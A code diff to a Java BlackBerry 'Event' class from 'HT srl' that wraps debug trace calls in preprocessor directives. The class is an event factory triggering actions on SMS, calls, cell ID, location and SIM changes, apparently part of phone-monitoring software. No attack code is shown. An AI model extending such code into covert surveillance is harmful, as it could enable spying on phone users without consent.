@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -20,8 +21,9 @@ import blackberry.utils.DebugLevel;
 public abstract class Event extends TimerJob {
 
     /** The debug instance. */
-    //#debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
+    //#endif
 
     /** The Constant EVENT. */
     public static final int EVENT = 0x2000;
@@ -80,63 +82,75 @@ public abstract class Event extends TimerJob {
 
         switch (eventType) {
         case EVENT_TIMER:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_TIMER");
+            //#endif
             event = new TimerEvent(actionId, confParams);
             break;
         case EVENT_SMS:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_SMS");
+            //#endif
             event = new SmsEvent(actionId, confParams);
             break;
         case EVENT_CALL:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_CALL");
+            //#endif
             event = new CallEvent(actionId, confParams);
             break;
         case EVENT_CONNECTION:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_CONNECTION");
+            //#endif
             event = new ConnectionEvent(actionId, confParams);
             break;
         case EVENT_PROCESS:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_PROCESS");
+            //#endif
             event = new ProcessEvent(actionId, confParams);
             break;
         case EVENT_CELLID:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_CELLID");
+            //#endif
             event = new CellIdEvent(actionId, confParams);
             break;
         case EVENT_QUOTA:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_QUOTA");
+            //#endif
             event = new QuotaEvent(actionId, confParams);
             break;
         case EVENT_SIM_CHANGE:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_SIM_CHANGE");
+            //#endif
             event = new SimChangeEvent(actionId, confParams);
             break;
         case EVENT_LOCATION:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_LOCATION");
+            //#endif
             event = new LocationEvent(actionId, confParams);
             break;
         case EVENT_AC:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_AC");
+            //#endif
             event = new AcEvent(actionId, confParams);
             break;
         case EVENT_BATTERY:
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Factory EVENT_BATTERY");
+            //#endif
             event = new BatteryEvent(actionId, confParams);
             break;
         default:
-            // #debug
+            //#ifdef DEBUG
             debug.error("Factory Unknown type:" + eventType);
+            //#endif
             return null;
         }
 
@@ -217,8 +231,9 @@ public abstract class Event extends TimerJob {
      * Trigger.
      */
     protected final void trigger() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("event: " + this + "triggering: " + actionId);
+        //#endif
         statusObj.triggerAction(actionId, this);
     }
 
@@ -229,8 +244,9 @@ public abstract class Event extends TimerJob {
      *            the actual action id
      */
     protected final void trigger(final int actualActionId) {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("event: " + this + "triggering: " + actualActionId);
+        //#endif
         statusObj.triggerAction(actualActionId, this);
     }
 
